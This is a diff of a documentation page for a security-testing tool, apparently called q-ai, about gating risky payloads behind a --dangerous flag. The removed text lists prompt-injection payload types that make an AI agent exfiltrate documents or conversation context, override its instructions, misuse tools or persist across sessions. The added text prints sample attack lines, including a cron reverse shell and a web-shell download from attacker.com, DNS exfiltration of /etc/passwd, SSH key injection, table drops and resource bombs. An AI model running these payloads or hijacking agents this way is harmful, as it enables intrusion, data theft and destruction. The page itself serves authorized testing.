@@ -1,89 +1,454 @@
 ---
-title: Dangerous Payloads
-description: Exfil, SSRF, and behavior modification payloads — gating and responsible use
+title: Dangerous Payloads Configuration
+description: Control access to high-risk payload injection types with the --dangerous flag
 ---
 
-q-ai gates payload types that go beyond proof-of-execution callbacks behind the `--dangerous` flag. This page explains what dangerous payloads are, why they're gated, and how to use them responsibly.
+# Dangerous Payloads Configuration
 
----
+Control access to high-risk payload injection types that could impact production systems or violate policies.
 
-## What "Dangerous" Means
+## Overview
 
-Dangerous payloads instruct the AI agent to take actions beyond firing a simple HTTP callback. These actions could cause real harm if directed at unintended targets:
+Some payload injection techniques carry elevated risk due to their potential impact:
 
-| Payload Type | What It Does | Risk if Misdirected |
-|-------------|-------------|---------------------|
-| `exfil_summary` | Instructs the agent to send a document summary to the listener | Leaks document content to an attacker-controlled server |
-| `exfil_context` | Instructs the agent to send conversation context to the listener | Leaks private conversation data including user messages |
-| `ssrf_internal` | Directs the agent to make requests to internal network endpoints | Enables reconnaissance or exploitation of internal services |
-| `instruction_override` | Attempts to override the agent's system instructions | Hijacks agent behavior, potentially affecting all users |
-| `tool_abuse` | Instructs the agent to misuse its available tools | Unauthorized file access, code execution, or API calls |
-| `persistence` | Attempts to persist instructions across agent sessions | Long-term compromise without re-injection |
+- **Resource exhaustion**: CPU, memory, or disk consumption
+- **Service disruption**: Crashing applications or consuming all resources
+- **Data manipulation**: Modifying or deleting data
+- **System compromise**: Installing backdoors or persistence mechanisms
+- **Policy violations**: Techniques that may violate compliance requirements
 
-The `callback` payload type is always available — it only proves that the agent executed the instruction, without causing any side effects beyond a single HTTP GET.
+The `--dangerous` flag requires explicit opt-in for these payload types to prevent accidental misuse.
 
----
+## Dangerous Payload Categories
 
-## Why They're Gated
+### Resource Exhaustion Payloads
 
-The `--dangerous` flag exists to prevent accidental deployment:
-
-- **Explicit opt-in** — You must consciously decide to use dangerous payloads, not accidentally include them through a default setting
-- **Authorization confirmation** — The flag serves as documentation that the operator understood the payload's behavior
-- **Audit trail** — The payload type is recorded in the campaign database, making it clear what was tested
-
----
-
-## How to Enable
-
-Add `--dangerous` to the `ipi generate` command:
+Payloads designed to consume resources:
 
 ```bash
-# Callback only — no flag needed
-qai ipi generate --callback http://localhost:8080
+# Infinite loop payload
+payload: "while(true) {}"
 
-# Exfil payload — requires --dangerous
-qai ipi generate \
-  --callback http://localhost:8080 \
-  --payload-type exfil_summary \
-  --dangerous
+# Memory allocation bomb
+payload: "let arr = []; while(true) { arr.push(new Array(1000000)); }"
 
-# SSRF payload — requires --dangerous
-qai ipi generate \
-  --callback http://localhost:8080 \
-  --payload-type ssrf_internal \
-  --dangerous
+# Regex denial of service (ReDoS)
+payload: "string.match(/((a+)+)+b/)"
 ```
 
-When `--dangerous` is active, the CLI displays a warning banner before generating:
+These require `--dangerous` flag:
 
-```
-============================================================
-  WARNING: DANGEROUS PAYLOAD TYPE ENABLED
-  Type: exfil_summary
-  For authorized security testing only.
-============================================================
+```bash
+qai inject --dangerous \
+  --payload-type resource-exhaustion \
+  --target-url http://vulnerable-app.local
 ```
 
-Without the flag, attempting to use a non-callback payload type exits with an error:
+### Data Manipulation Payloads
 
+Payloads that modify or destroy data:
+
+```bash
+# SQL deletion
+payload: "'; DROP TABLE users; --"
+
+# File system deletion
+payload: "rm -rf /important/data"
+
+# Database truncation
+payload: "TRUNCATE TABLE orders"
 ```
-X Payload type 'exfil_summary' requires --dangerous flag
-  Non-callback payloads can cause real harm to target systems.
-  Use --dangerous to confirm authorized testing.
+
+Requires explicit flag:
+
+```bash
+qai inject --dangerous \
+  --payload-type data-manipulation \
+  --target-url http://vulnerable-app.local
 ```
-
----
-
-## Safety Guidelines
 
 <Warning>
-Dangerous payloads are designed for authorized security testing only. Misuse may violate laws, regulations, or organizational policies.
+Data manipulation payloads carry high risk. Always test in isolated environments first. Never run against production without explicit approval.
 </Warning>
 
-- **Only test systems you own or have explicit written authorization to test.** Deploying dangerous payloads against third-party systems without permission may constitute unauthorized access.
-- **Use isolated test environments where possible.** This limits the blast radius if a payload behaves unexpectedly.
-- **Exfil payloads will send data to your listener.** Ensure no sensitive or regulated data (PII, PHI, financial records) is at risk in the test environment. The listener stores captured data in the local SQLite database.
-- **SSRF payloads will cause the target to make outbound HTTP requests.** Verify that the target's network egress is acceptable — the agent may attempt to reach internal services that could be affected by the request.
-- **Instruction override and persistence payloads affect agent behavior.** Test in isolated agent instances that don't serve other users. Reset the agent state after testing.
-- **Document your authorization.** Record the scope, systems, and payload types authorized for each test engagement.
+### Persistence Payloads
+
+Payloads that establish long-term access:
+
+```bash
+# Cron-based backdoor
+payload: "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/1234 0>&1\"' | crontab"
+
+# SSH key injection
+payload: "echo 'attacker-public-key' >> ~/.ssh/authorized_keys"
+
+# Web shell installation
+payload: "wget http://attacker.com/shell.php -O /var/www/html/shell.php"
+```
+
+Requires explicit authorization:
+
+```bash
+qai inject --dangerous \
+  --payload-type persistence \
+  --target-url http://vulnerable-app.local
+```
+
+### Privilege Escalation Payloads
+
+Payloads that attempt to gain elevated privileges:
+
+```bash
+# Sudo exploitation
+payload: "sudo -u root /bin/bash"
+
+# SetUID binary exploitation
+payload: "find / -perm -4000 2>/dev/null"
+
+# Kernel exploit attempt
+payload: "insmod /path/to/rootkit.ko"
+```
+
+Restricted by default:
+
+```bash
+qai inject --dangerous \
+  --payload-type privilege-escalation \
+  --target-url http://vulnerable-app.local
+```
+
+### Network-Based Attacks
+
+Payloads that impact network infrastructure:
+
+```bash
+# DNS exfiltration
+payload: "nslookup $(cat /etc/passwd | base64)@attacker.com"
+
+# Network scanning
+payload: "nmap -p- 10.0.0.0/8"
+
+# DDoS reflection
+payload: "for i in {1..10000}; do curl http://target.com & done"
+```
+
+Controlled by flag:
+
+```bash
+qai inject --dangerous \
+  --payload-type network-attack \
+  --target-url http://vulnerable-app.local
+```
+
+## Enabling Dangerous Payloads
+
+### Command-Line Flag
+
+Use the `--dangerous` flag to enable dangerous payload types:
+
+```bash
+# Basic usage
+qai inject --dangerous \
+  --framework owasp-top-10 \
+  --target-url http://vulnerable-app.local
+
+# With specific payload type
+qai inject --dangerous \
+  --payload-type resource-exhaustion \
+  --target-url http://vulnerable-app.local
+
+# Force dangerous (no confirmation prompt)
+qai inject --dangerous --no-confirm \
+  --target-url http://vulnerable-app.local
+```
+
+### Environment Variable
+
+Set via environment for automation:
+
+```bash
+# Enable dangerous payloads
+export QAI_DANGEROUS_PAYLOADS=true
+
+# Then run without --dangerous flag
+qai inject --framework owasp-top-10 --target-url http://vulnerable-app.local
+```
+
+### Configuration File
+
+Define in `qai.json`:
+
+```json
+{
+  "modules": {
+    "inject": {
+      "dangerous_payloads_enabled": false,
+      "require_dangerous_flag": true,
+      "dangerous_payload_types": [
+        "resource-exhaustion",
+        "data-manipulation",
+        "persistence",
+        "privilege-escalation",
+        "network-attack"
+      ]
+    }
+  }
+}
+```
+
+## Safety Mechanisms
+
+### Confirmation Prompt
+
+When using `--dangerous`, you must confirm:
+
+```bash
+$ qai inject --dangerous --target-url http://localhost
+
+⚠️  WARNING: Dangerous Payloads Enabled
+═══════════════════════════════════════════════════════════════
+
+This campaign will use high-risk payloads that could:
+  • Cause service disruption or outages
+  • Modify or delete data
+  • Consume excessive resources
+  • Establish persistent access
+  • Violate compliance requirements
+
+Target: http://localhost
+Campaign: injection_abc123
+
+Type 'yes' to confirm and proceed: yes
+
+Starting dangerous payload campaign...
+```
+
+Skip confirmation with `--no-confirm` (dangerous):
+
+```bash
+qai inject --dangerous --no-confirm --target-url http://localhost
+```
+
+### Payload Limits
+
+Dangerous payloads have built-in limits:
+
+```json
+{
+  "modules": {
+    "inject": {
+      "resource_limits": {
+        "cpu_timeout_seconds": 30,
+        "memory_limit_mb": 512,
+        "disk_write_limit_mb": 100,
+        "execution_timeout_seconds": 60
+      },
+      "rate_limiting": {
+        "payloads_per_minute": 10,
+        "burst_limit": 5
+      }
+    }
+  }
+}
+```
+
+### Sandboxing
+
+Payloads execute in isolated environments when possible:
+
+```bash
+# Run in Docker container (recommended for dangerous payloads)
+qai inject --dangerous \
+  --sandbox docker \
+  --target-url http://vulnerable-app.local
+
+# Run with resource limits (cgroups on Linux)
+qai inject --dangerous \
+  --sandbox cgroups \
+  --memory-limit 512m \
+  --cpu-limit 1 \
+  --target-url http://vulnerable-app.local
+```
+
+## Approval and Auditing
+
+### Audit Trail
+
+All dangerous payload executions are logged:
+
+```bash
+# View dangerous payload history
+qai audit dangerous-payloads
+
+# Export audit log
+qai audit dangerous-payloads --export json > dangerous_audit.json
+
+# Filter by date range
+qai audit dangerous-payloads --since 2024-03-01 --until 2024-03-31
+```
+
+Audit log entry:
+
+```json
+{
+  "timestamp": "2024-03-22T10:30:15Z",
+  "user": "security-engineer",
+  "action": "dangerous_payload_executed",
+  "campaign_id": "campaign_abc123",
+  "payload_type": "data-manipulation",
+  "target": "http://vulnerable-app.local",
+  "result": "successful",
+  "approver": "security-manager",
+  "approval_ticket": "SEC-1234"
+}
+```
+
+### Approval Workflows
+
+Require approvals for dangerous payloads in automated workflows:
+
+```yaml
+# CI/CD approval requirement
+name: Dangerous Payload Campaign
+on: workflow_dispatch
+jobs:
+  dangerous_inject:
+    environment:
+      name: dangerous-payloads
+      deployment-branch: main
+    steps:
+      - name: Run dangerous campaign
+        run: |
+          qai inject --dangerous \
+            --target-url ${{ secrets.TARGET_URL }}
+```
+
+### Notification System
+
+Alert on dangerous payload usage:
+
+```json
+{
+  "modules": {
+    "inject": {
+      "notifications": {
+        "dangerous_payload_enabled": {
+          "channels": ["email", "slack"],
+          "recipients": ["security-team@example.com"],
+          "slack_channel": "#security-alerts"
+        }
+      }
+    }
+  }
+}
+```
+
+## Production Safeguards
+
+### Prohibited Environments
+
+Prevent dangerous payloads in production:
+
+```bash
+# Configure environment
+export QAI_ENVIRONMENT=production
+
+# This will block dangerous payloads
+qai inject --dangerous --target-url http://prod-app.example.com
+# Error: Dangerous payloads not allowed in production environment
+```
+
+Configuration:
+
+```json
+{
+  "environment_restrictions": {
+    "production": {
+      "allow_dangerous": false,
+      "requires_ticket": true,
+      "requires_approval": true,
+      "approval_timeout_hours": 1
+    },
+    "staging": {
+      "allow_dangerous": true,
+      "requires_ticket": false,
+      "requires_approval": false
+    },
+    "development": {
+      "allow_dangerous": true,
+      "requires_ticket": false,
+      "requires_approval": false
+    }
+  }
+}
+```
+
+### Backup and Recovery
+
+Always maintain backups before dangerous payloads:
+
+```bash
+# Automatic backup before dangerous payloads
+qai inject --dangerous \
+  --create-backup \
+  --backup-location /backups/pre-injection \
+  --target-url http://vulnerable-app.local
+```
+
+### Rollback Plan
+
+Define rollback procedures:
+
+```json
+{
+  "dangerous_payload_config": {
+    "rollback_enabled": true,
+    "rollback_timeout_minutes": 30,
+    "automated_rollback_triggers": [
+      "service_unavailable",
+      "cpu_usage_above_90",
+      "disk_full",
+      "error_rate_above_5_percent"
+    ]
+  }
+}
+```
+
+## Best Practices
+
+1. **Always use dedicated test environments**: Never use dangerous payloads against production
+2. **Get explicit approval**: Require documented approval from appropriate stakeholders
+3. **Use sandboxing**: Run in containers or VMs with resource limits
+4. **Maintain audit trails**: Log all dangerous payload activities
+5. **Create backups**: Always backup before attempting data manipulation
+6. **Set timeouts**: Configure execution timeouts to prevent infinite loops
+7. **Monitor resources**: Watch CPU, memory, disk during execution
+8. **Document rationale**: Explain why each dangerous payload is necessary
+9. **Plan rollback**: Have procedures to undo changes
+10. **Test with staging**: Test all payloads in staging before any other environment
+
+## Disabling Dangerous Payloads
+
+Completely disable dangerous payload support:
+
+```json
+{
+  "modules": {
+    "inject": {
+      "dangerous_payloads_enabled": false,
+      "block_dangerous_attempts": true,
+      "log_dangerous_attempts": true
+    }
+  }
+}
+```
+
+This prevents all dangerous payload execution, even with `--dangerous` flag.
+
+## Next Steps
+
+- Review dangerous payload policies
+- Set up approval workflows
+- Configure environment restrictions
+- Document dangerous payload procedures
+- Run payloads only in approved test environments
